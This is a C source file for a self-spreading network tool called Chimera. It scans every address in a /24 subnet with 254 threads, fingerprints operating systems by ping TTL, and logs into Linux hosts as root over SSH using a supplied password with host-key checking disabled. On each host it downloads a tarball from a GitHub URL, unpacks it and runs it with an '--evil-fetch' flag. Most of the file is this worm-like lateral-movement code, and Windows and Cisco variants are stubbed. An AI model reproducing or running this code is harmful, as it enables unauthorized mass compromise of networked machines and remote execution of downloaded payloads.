#include "net.h"


MaxSystemInfo max_system_info = {0, {0}};
pthread_mutex_t max_system_info_mutex = PTHREAD_MUTEX_INITIALIZER;


// Parse system information from a remote host
float *parse_system_info(const char *str) {
    float* max_resources_ptr = malloc(sizeof(float)); // allocate memory for the float pointer
    sscanf(str, "Max resources: %f MB", max_resources_ptr); // parse the input string
    return max_resources_ptr; // return the float pointer
}

void* spread_worker(void* data) {
    ThreadData* thread_data = (ThreadData*)data;
    int index = thread_data->index;
    const char* subnet = thread_data->subnet;
    const char* password = thread_data->password;
    char* username = NULL;

    char host_ip[MAX_COMMAND_SIZE];
    int ret = snprintf(host_ip, sizeof(host_ip), "%s.%d", subnet, index);
    if (ret >= sizeof(host_ip)) {
        fprintf(stderr, "Host string too long\n");
        return NULL;
    }

    enum os_type host_os = get_os_type(host_ip);
    
    if (host_os != UNKNOWN) {
        if (host_os == LINUX) {
            username = "root";
            spread_linux(host_ip, username, password);

        } else if (host_os == WINDOWS) {
            username = "Administrator";
        } else {
            username = "cisco";
        }

    }
    free(data);
    return NULL;
}


/**
 * Connects to a remote host and executes a command.
 *
 * @param host The hostname or IP address of the remote host.
 * @param username The username to use for the connection. (OPTIONAL)
 * @param password The password to use for the connection.
 * @param command The command to execute on the remote host.
 * @param remote_os The operating system of the remote host.
 */
char* remote_execution(const char* host, const char* username, const char* password, const char* command, const enum os_type remote_os) {
    char command_string[MAX_COMMAND_SIZE];
    int ret;
    
    if(remote_os == LINUX) {
        #ifdef _WIN32
            ret = snprintf(command_string, sizeof(command_string), "echo y | %s -ssh %s -l %s -pw %s -o ConnectTimeout=1 -o StrictHostKeyChecking=no\"%s\"",
                PLINK_EXE_PATH, host, username, password, command);
        #else 
            ret = snprintf(command_string, sizeof(command_string), "%s -p \"%s\" ssh -o ConnectTimeout=1 -o StrictHostKeyChecking=no %s@%s \"%s\" 2>&1",
                SSHPASS_PATH, password, username, host, command);
        #endif
        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return NULL;
        }
    } 
    // Construct the command string for a Windows host
    else if (remote_os == WINDOWS) {
        #ifdef _WIN32
            // Construct the command string for a Windows host using psexec
            ret = snprintf(command_string, sizeof(command_string), "%s \\\\%s -i -u %s -p %s %s",
                PS_EXEC_PATH, host, username, password, command);
        #else
            // Construct the command string for a Windows host using winexe
            ret = snprintf(command_string, sizeof(command_string), "%s -U %s%%%s //%s \"%s\"",
                WIN_EXE_PATH, username, password, host, command);
        #endif
        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return NULL;
        }
    } 
    // Handle invalid operating system values
    else {
        fprintf(stderr, "Invalid operating system\n");
        return NULL;
    }

    // Open a pipe to execute the command string and read the output
    FILE* fp = POPEN(command_string, "r");
    if (fp == NULL) {
        perror("popen");
        return NULL;
    }

    // Allocate a buffer to hold the output of the command
    char* output_buffer = (char*) malloc(MAX_COMMAND_SIZE);
    if (output_buffer == NULL) {
        fprintf(stderr, "Failed to allocate output buffer\n");
        PCLOSE(fp);
        return NULL;
    }

    // Read the output of the command into the buffer
    size_t bytes_read = fread(output_buffer, 1, MAX_COMMAND_SIZE, fp);
    if (bytes_read == 0 ) {
        // Check for authenitcaiton fialure 
        // fprintf(stderr, "Failed to read command output\n");
        free(output_buffer);
        PCLOSE(fp);
        return NULL;
    }

    // Close the pipe and check for errors
    if (PCLOSE(fp) == -1) {
        perror("pclose");
        free(output_buffer);
        return NULL;
    }

    // Make sure not to read memory beyond the valid range of the output buffer
    if (bytes_read >= MAX_COMMAND_SIZE) {
        bytes_read = MAX_COMMAND_SIZE - 1;
    }

    // Null-terminate the output buffer
    output_buffer[bytes_read] = '\0';

    // Resize the output buffer to the actual size of the output
    char* resized_output_buffer = realloc(output_buffer, bytes_read + 1);
    if (resized_output_buffer == NULL) {
        fprintf(stderr, "Failed to resize output buffer\n");
        free(output_buffer);
        return NULL;
    }

    return resized_output_buffer;
}

/**
 * Spreads chimera on linux
 * 
 * @param host The hostname or IP address of the remote host.
 * @param username The username to use for the connection. (OPTIONAL)
 * @param password The password to use for the connection.
 * 
 * The workflow for spreading Chimera on linux is as follows:
 * 1. Check if the "Chimera" directory exists on the remote Linux machine
 * 2. If the "Chimera" directory does not exist, download the zip file from the URL
 * 3. Unzip the zip file
 * 4. Change the permissions of the "Chimera" directory to 777
 * 5. Change the permissions of the "Chimera" executable to 777
 * 6. Run the "Chimera" executable
 *  
 */
void spread_linux(const char* host, const char* username, const char* password) {
    printf("[+] Spreading Chimera on %s.\n", host);
    char* output = remote_execution(host, username, password, CURL_ONE_LINER, LINUX);
    if (output != NULL) {
        if(strstr(output, "Permission denied, please try again.") != NULL) {
            printf("[-] Failed to spread Chimera on %s. Authentication failed.\n", host);
            free(output);
            return;
        } else {
            free(output);
            output = NULL;
        }
    }
    // Check if the "Chimera" directory exists on the remote Linux machine
    const char* check_chimera_dir_cmd = "sh -c 'if [ ! -d \"Chimera\" ]; then echo \"NOT_EXIST\"; fi' 2>&1";
    output = remote_execution(host, username, password, check_chimera_dir_cmd, LINUX);
    
    if (output != NULL && strcmp(output, "NOT_EXIST\n") == 0) {

        // Download the zip file from the URL
        // curl -L -o chimera_linux.tar.gz https://github.com/M00NLIG7/Chimera/raw/master/chimera_linux.tar.gz
        const char* url = "https://github.com/M00NLIG7/Chimera/raw/master/chimera_linux.tar.gz";
        const char* filename = "chimera_linux.tar.gz";
        char command_string[MAX_COMMAND_SIZE];
        int ret;

        ret = snprintf(command_string, sizeof(command_string), "curl -L -o %s %s >/dev/null 2>&1", filename, url);
        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return;
        }

        output = remote_execution(host, username, password, command_string, LINUX);
        if (output != NULL) {
            free(output);
            output = NULL;
        }


        // tar -zxf chimera_linux.tar.gz >/dev/null 2>&1
        // Unzip the file on the remote Linux machine
        ret = snprintf(command_string, sizeof(command_string), "tar -zxf %s >/dev/null 2>&1", filename);
        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return;
        }

        output = remote_execution(host, username, password, command_string, LINUX);
        if (output != NULL) {
            free(output);
            output = NULL;
        }
        

        // Remove the zip file
        ret = snprintf(command_string, sizeof(command_string), "rm -f %s", filename);
        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return;
        }
        
        output = remote_execution(host, username, password, command_string, LINUX);

        if (output != NULL) {
            free(output);
            output = NULL;
        }

        ret = snprintf(command_string, sizeof(command_string), "cd Chimera && ./chimera --evil-fetch", host);

        if (ret >= sizeof(command_string)) {
            fprintf(stderr, "Command string too long\n");
            return;
        }

        output = remote_execution(host, username, password, command_string, LINUX);

        if (output != NULL) {
            float* p_system_info = parse_system_info(output);

            // Lock the mutex before updating the max_system_info structure
            pthread_mutex_lock(&max_system_info_mutex);

            if (*p_system_info > max_system_info.p_system_info) {
                max_system_info.p_system_info = *p_system_info;
                strncpy(max_system_info.ip, host, sizeof(max_system_info.ip) - 1);
                max_system_info.ip[sizeof(max_system_info.ip) - 1] = '\0';
            }

            // Unlock the mutex after updating the max_system_info structure
            pthread_mutex_unlock(&max_system_info_mutex);

            free(p_system_info);
            free(output);
            output = NULL;
        }
    } else if (output == NULL) {
        // fprintf(stderr, "Failed to check Chimera directory on remote host.\n");
    } else {
        printf("Chimera directory already exists on remote host: %s.\n", host);
    }

    if (output != NULL) {
        free(output);
        output = NULL;
    }
}

void spread_windows(const char* host, const char* username, const char* password) {
    // implementation for spreading to Windows host
}

void spread_cisco(const char* host, const char* username, const char* password) {
    // implementation for spreading to Windows host
}

/**
 * Tries to spread Chimera across the subnet
 *
 * @param subnet The subnet of the remote hosts. i.e. 192.168.1
 * @param password The password to use for the connection.
 * @param command The command to execute on the remote host.
 * @param remote_os The operating system of the remote host.
 */

void spread(const char* subnet, const char* password) {
    pthread_t threads[254];

    for (int i = 0; i < 254; i++) {
        ThreadData* data = (ThreadData*)malloc(sizeof(ThreadData));
        data->index = i;
        data->subnet = subnet;
        data->password = password;
        pthread_create(&threads[i], NULL, spread_worker, data);
    }

    for (int i = 0; i < 254; i++) {
        pthread_join(threads[i], NULL);
    }
    printf("System with highest p_system_info: %s (%f)\n", max_system_info.ip, max_system_info.p_system_info);
}


/**
 * Enumerates the operating system of the remote host.
 *
 * @param ip_address The IP address of the remote host.
 */
enum os_type get_os_type(const char *ip_address) {
    char command[MAX_BUF_SIZE];
    #if defined(_WIN32) || defined(_WIN64)
        snprintf(command, sizeof(command), "ping -n 1 -w 5 %s", ip_address);
        const char* ttl_str = "TTL=";
    #elif defined(__linux__)
        snprintf(command, sizeof(command), "ping -c 1 -W 5 %s", ip_address);
        const char* ttl_str = "ttl=";
    #else
        #error "Unsupported platform"
    #endif
    
    // fprintf(stderr, "Command: %s\n", command);

    FILE *ping_output = popen(command, "r");
    if (ping_output == NULL) {
        perror("popen");
        return UNKNOWN;
    }

    char output_buf[MAX_BUF_SIZE];
    size_t bytes_read = fread(output_buf, 1, sizeof(output_buf), ping_output);
    pclose(ping_output);

    if (bytes_read == 0) {
        fprintf(stderr, "Failed to read ping output: %s\n", strerror(errno));
        return UNKNOWN;
    }

    int ttl = -1;

    char* ttl_start = strstr(output_buf, ttl_str);
    if (ttl_start == NULL) {
        // TTL/ttl value not found in the output
        // fprintf(stderr, "Failed to find TTL/ttl value in ping output\n");
        return UNKNOWN;
    }

    // Extract TTL/ttl from the output buffer
    char *ttl_val_str = ttl_start + strlen(ttl_str);
    if (sscanf(ttl_val_str, "%d", &ttl) != 1) {
        // fprintf(stderr, "Failed to parse TTL/ttl value: %s\n", ttl_val_str);
        return UNKNOWN;
    }

    switch (ttl) {
        case 64:
            return LINUX;
        case 128:
            return WINDOWS;
        case 255:
            return CISCO;
        default:
            return UNKNOWN;
    }
}
